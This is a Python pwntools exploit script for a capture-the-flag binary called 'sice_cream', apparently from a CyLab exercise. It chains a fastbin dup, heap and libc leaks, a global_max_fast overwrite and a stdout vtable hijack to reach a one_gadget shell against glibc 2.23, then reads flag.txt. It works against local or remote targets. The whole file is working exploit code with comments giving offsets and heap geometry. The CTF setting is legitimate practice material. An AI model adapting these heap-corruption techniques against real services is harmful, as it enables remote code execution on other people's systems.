#!/usr/bin/env python3
# sice_cream (CyLab 55) — fastbin-dup -> libc leak -> global_max_fast -> stdout.vtable -> one_gadget
#
# Geometry (measured on the real heap, see RESUME):
#   grooming buy #0 returns the leftover unsorted chunk at 0x602050 (BSS, NOT heap)
#   grooming buy #k>=1 returns heap + 0xd0 + (k-1)*0x50
#   => fake chunk = heap+0xd0 (header), its user ptr p = heap+0xe0
#      *(heap+0xd8) = pay0[8:16] = 0x17b0
#      chunk_at_offset(heap+0xd0, 0x17b0)->size = *(heap+0x1888) = size of groom chunk #77 (0x51)
import os, sys, struct, time
from pwn import *

context.log_level = os.environ.get('LOG', 'error')
context.arch = 'amd64'
LOG = context.log_level

OFF_UNSORTED  = 0x3c4b78
OFF_GMF       = 0x3c67f8
OFF_STDOUT    = 0x3c5620
OFF_STDOUT_VT = 0x3c56f8
ONE_GADGETS   = [0x4526a, 0xf02a4, 0xf1147, 0x45216]
FAKE_FAST     = 0x602120
CREAMS        = 0x602140
NCHUNK        = 78
GROOM_DELTA   = 0xd0      # groom #1 user ptr - heap
P_DELTA       = 0xe0      # user ptr freed by eat(1) - heap

p = None
pid = None

def peek(addr, n):
    if pid is None:
        return None
    try:
        with open('/proc/%d/mem' % pid, 'rb') as f:
            f.seek(addr)
            return f.read(n)
    except Exception:
        return None

def q(addr):
    d = peek(addr, 8)
    return u64(d) if d and len(d) == 8 else None

def creams_now():
    d = peek(CREAMS, 160)
    return list(struct.unpack('<20Q', d)) if d and len(d) == 160 else None

def start(mode='local', host=None, port=None):
    global p, pid
    if mode == 'remote':
        p = remote(host, int(port)); pid = None
    else:
        p = process(['./ld-2.23.so', '--library-path', '.', './sice_cream'],
                    cwd=os.environ.get('WD', '/mnt/d/ctf-index/_z_55'),
                    stderr=process.STDOUT)
        pid = p.pid

def buy(size, data):
    p.recvuntil(b'> '); p.send(b'1\n')
    p.recvuntil(b'> '); p.send(str(size).encode() + b'\n')
    p.recvuntil(b'> '); p.send(data)
    p.recvuntil(b'Here you go!')

def eat(idx, wait=True):
    p.recvuntil(b'> '); p.send(b'2\n')
    p.recvuntil(b'> '); p.send(str(idx).encode() + b'\n')
    if wait:
        return p.recvuntil(b'Yum!', timeout=5)

def reintro(data):
    p.recvuntil(b'> '); p.send(b'3\n')
    p.recvuntil(b'> '); p.send(data)
    p.recvuntil(b'Ah, right! How could a forget a name like ')
    return p.recvuntil(b'!', timeout=5)

def nbytes(hdrs, fill=b'A'):
    nm = bytearray(fill * 0x100)
    for off, val in hdrs.items():
        nm[off:off + 8] = p64(val)
    return bytes(nm)

def exploit(gadget_idx=0):
    """returns the final user ptr p (only meaningful locally for peek checks)"""
    # ---------- stage 1a: two chunks + heap leak ----------
    nm = bytearray(b'A' * 0x100)
    nm[0xf0:0xf8] = p64(0); nm[0xf8:0x100] = p64(0x60)
    p.recvuntil(b'Whats your name?'); p.recvuntil(b'> ')
    p.send(bytes(nm))
    buy(0x58, b'A' * 0x58)                  # creams[0]
    buy(0x58, b'B' * 0x58)                  # creams[1]
    out = reintro(b'A' * 0x100)             # printf(name) runs into creams[]
    hp = out[:-1][0x100:0x106]
    if len(hp) < 6:
        log.warning("heap leak short"); return None
    heap = u64(hp + b'\x00\x00') - 0x10
    log.info("heap = %#x" % heap)
    reintro(nbytes({0xe8: 0x61, 0xf0: FAKE_FAST, 0xf8: 0x60}))

    # ---------- stage 1b: fastbin dup -> creams[] control ----------
    eat(0); eat(1); eat(0)
    buy(0x58, p64(FAKE_FAST))
    buy(0x58, b'D' * 0x58)
    buy(0x58, p64(0) + p64(0x61) + p64(FAKE_FAST) + b'E' * 0x40)
    buy(0x58, p64(0) * 2 + p64(FAKE_FAST) + p64(0x602050) + p64(0) * 7)

    # ---------- stage 1c: libc leak ----------
    reintro(nbytes({0x08: 0x91, 0x98: 0x21, 0xb8: 0x21, 0xe8: 0x61,
                    0xf0: FAKE_FAST, 0xf8: 0x60}))
    eat(1)                                  # free(0x602050) -> unsorted
    out = reintro(b'B' * 0x10)
    ptr = out[0x10:0x16]
    if len(ptr) < 6:
        log.warning("libc leak short: %r" % out); return None
    libc = u64(ptr + b'\x00\x00') - OFF_UNSORTED
    if libc & 0xfff:
        log.warning("libc misaligned %#x" % libc); return None
    log.success("libc = %#x" % libc)
    gmf       = libc + OFF_GMF
    stdout_vt = libc + OFF_STDOUT_VT
    gadget    = libc + ONE_GADGETS[gadget_idx]
    log.info("gadget=%#x stdout_vt=%#x gmf=%#x" % (gadget, stdout_vt, gmf))

    reintro(nbytes({0x00: 0, 0x08: 0x91, 0x10: 0, 0x18: libc + OFF_UNSORTED,
                    0x90: 0x90, 0x98: 0x21, 0xb8: 0x21, 0xe8: 0x61,
                    0xf0: FAKE_FAST, 0xf8: 0x60}))

    creams = [0] * 20
    creams[0] = FAKE_FAST
    creams[1] = 0x602050
    def reset(final=False):
        pay = [FAKE_FAST, 0, FAKE_FAST, 0, 0, 0, 0, 0, 0, 0, 0]
        if final:
            pay = [FAKE_FAST, 0, FAKE_FAST, heap + P_DELTA, 0x602050, 0x602080, 0, 0, 0, 0, 0]
        buy(0x58, b''.join(p64(x) for x in pay))
        vals = pay[2:] + [0, 0]
        for i in range(9):
            creams[i] = vals[i]

    # ---------- heap grooming: 78 x 0x50 ----------
    pay0 = bytearray(b'C' * 0x48)
    pay0[8:16] = p64(0x17c0)          # size -> fastbin_index 378 = &fastbinsY[378] = stdout.vtable
    pay0[0x30:0x38] = p64(gadget)     # == vtable->__xsputn (vtable = heap+0xd0)
    made = 0
    while made < NCHUNK:
        free_low = [i for i in range(9) if creams[i] == 0]
        if len(free_low) < 2:
            reset()
            free_low = [i for i in range(9) if creams[i] == 0]
        s = free_low[0]
        if made == 1:
            data = bytes(pay0)        # first HEAP chunk (buy #0 goes to BSS 0x602050)
        elif made == 77:
            # fake chunk = heap+0xd0, S=0x17c0 -> next-size read at heap+0x1898,
            # which is user+8 of groom chunk #77 (user 0x1890). Must look like a size.
            data = p64(0) + p64(0x51) + b'C' * 0x38
        else:
            data = b'C' * 0x48
        buy(0x48, data)
        creams[s] = 1
        made += 1
    log.info("groomed %d x 0x50 chunks" % made)
    if pid:
        log.info("check: size@heap+0xd8=%#x  nextsize@heap+0x1898=%#x" %
                 (q(heap + 0xd8) or 0, q(heap + 0x1898) or 0))

    # ---------- final reset: creams[1]=p, [2]=V1, [3]=V2 ----------
    reset(final=True)
    if pid:
        c = creams_now()
        log.info("final creams=%r" % (c,))
        if c:
            assert c[1] == heap + P_DELTA, "creams[1] %#x" % c[1]

    # ---------- stage 2a: global_max_fast = unsorted ----------
    reintro(nbytes({0x08: 0x91, 0x38: 0x91, 0x98: 0x21, 0xb8: 0x21,
                    0xc8: 0x21, 0xd8: 0x21, 0xe8: 0x61, 0xf0: FAKE_FAST, 0xf8: 0x60}))
    eat(2)                                   # free V1 -> unsorted
    eat(3)                                   # free V2 -> unsorted
    reintro(nbytes({0x08: 0x51, 0x10: 0, 0x18: gmf - 0x10, 0x50: 0x50, 0x58: 0x21,
                    0x38: 0x91, 0x88: libc + OFF_UNSORTED,
                    0x98: 0x21, 0xb8: 0x21, 0xc8: 0x21, 0xd8: 0x21, 0xe8: 0x61,
                    0xf0: FAKE_FAST, 0xf8: 0x60}))
    buy(0x48, b'Q' * 0x48)                   # unsorted unlink -> *(gmf) = unsorted
    if pid:
        log.info("gmf now = %#x (want %#x)" % (q(gmf) or 0, libc + OFF_UNSORTED))

    # ---------- stage 2b: free(p) -> fastbin[378] -> stdout.vtable = heap+0xd0 ----------
    if os.environ.get('NOWAIT'):
        p.recvuntil(b'> '); p.send(b'2\n')
        p.recvuntil(b'> '); p.send(b'1\n')
        time.sleep(0.3)
        log.info("after free: stdout.vtable=%#x  alive=%r  want=%#x" %
                 (q(stdout_vt) or 0, p.poll() is None, heap + 0xd0))
        return heap + P_DELTA
    eat(1)
    if pid:
        log.info("stdout.vtable now = %#x (want %#x)" % (q(stdout_vt) or 0, heap + 0xd0))
        # locate where the freed chunk pointer actually landed
        base = libc + 0x3c4b20
        blob = peek(base, 0x2000)
        if blob:
            tgt = p64(heap + 0xd0)
            hits = [base + i for i in range(0, len(blob) - 8, 8) if blob[i:i + 8] == tgt]
            log.info("fastbin slot holding chunk: %r (offs=%r)" %
                     ([hex(h) for h in hits], [hex(h - libc) for h in hits]))
            log.info("stdout.vtable off=%#x  _IO_2_1_stdout_ off=%#x" %
                     (OFF_STDOUT_VT, OFF_STDOUT))
    return heap + P_DELTA

def attempt(gadget_idx, mode, host, port):
    global p, pid
    if p:
        try: p.close()
        except Exception: pass
    p = None; pid = None
    start(mode, host, port)
    try:
        r = exploit(gadget_idx)
    except EOFError:
        log.warning("gadget %#x: EOF" % ONE_GADGETS[gadget_idx]); return False
    except Exception as e:
        log.warning("gadget %#x: %r" % (ONE_GADGETS[gadget_idx], e)); return False
    if r is None:
        return False
    try:
        p.sendline(b'echo ---PWNED---; cat flag.txt; exit')
        out = p.recvrepeat(3)
        sys.stdout.write(out.decode('latin1'))
        if b'PWNED' in out or b'academy{' in out:
            print("[+] SHELL with gadget %#x" % ONE_GADGETS[gadget_idx])
            return True
    except Exception as e:
        log.warning("shell: %r" % e)
    return False

def main():
    mode = sys.argv[1] if len(sys.argv) > 1 else 'local'
    host = sys.argv[2] if len(sys.argv) > 2 else None
    port = sys.argv[3] if len(sys.argv) > 3 else None
    only = os.environ.get('GADGET')
    idxs = [int(only)] if only else range(len(ONE_GADGETS))
    for gi in idxs:
        if attempt(gi, mode, host, port):
            return
    print("[-] no shell")

if __name__ == '__main__':
    main()
